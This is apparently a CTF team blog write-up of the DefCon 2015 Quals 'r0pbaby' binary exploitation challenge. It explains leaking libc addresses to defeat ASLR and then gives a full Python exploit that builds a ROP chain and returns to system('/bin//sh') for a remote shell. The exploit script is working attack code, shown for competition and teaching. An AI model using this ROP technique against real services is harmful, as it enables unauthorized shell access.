---
layout: post
title: "DefCon 2015 Quals r0pbaby"
date: 2015-05-29 18:47:24 -0400
author: [barrebas,swappage]
comments: true
categories: [defcon]
---

### Solved by barrebas and Swappage

`r0pbaby` was a binary exploitation challenge in the LegitBS CTF. We were given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc's base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain... couldn't be easier, right? 

```bash
bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
```

So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc *version*. This took us some time to figure out, but luckily Swappage found an [offline tool to identify libc](https://github.com/niklasb/libc-database). It was `libc6_2.19-0ubuntu6.6_i386`. Another nice tool to identify libc is [libcdb.com](http://libcdb.com). After identifying the right libc version, we could find all the necessary gadgets via [ropshell.com](http://ropshell.com). Our plan was to `mprotect()` a certain region of memory as RWX, then `read()` in some shellcode and return to it. 

Now, the plan fell through. For some reason, the `read()` syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to `system()`, so I set up a ROP chain to `mprotect()` the first 0x1000 bytes of libc as RWX. Then, I wrote out the string `/bin//sh` to memory. At this point, it was getting late and I could have just as easily written out `/bin/sh,0` to memory... Finally, returning to `system("/bin//sh")` spawned a shell, allowing us to read the flag!

```python
import socket, struct, re, time

def p(x):
    return struct.pack('<Q', x)
    
def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect
# 00000000000f4a20 W mprotect
LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(POPRAX)
payload += p(10)
payload += p(SYSCAL)

# secondly, write '/bin' to memory via MOVMEM gadget
payload += p(POPRDX)
payload += p(0x6e69622f)
payload += p(POPRAX)
payload += p(LIBC_BASE)
payload += p(MOVMEM)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
```

Putting it all together:

![](/images/2015/defcon/r0pbaby/r0pbaby.png)

This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!

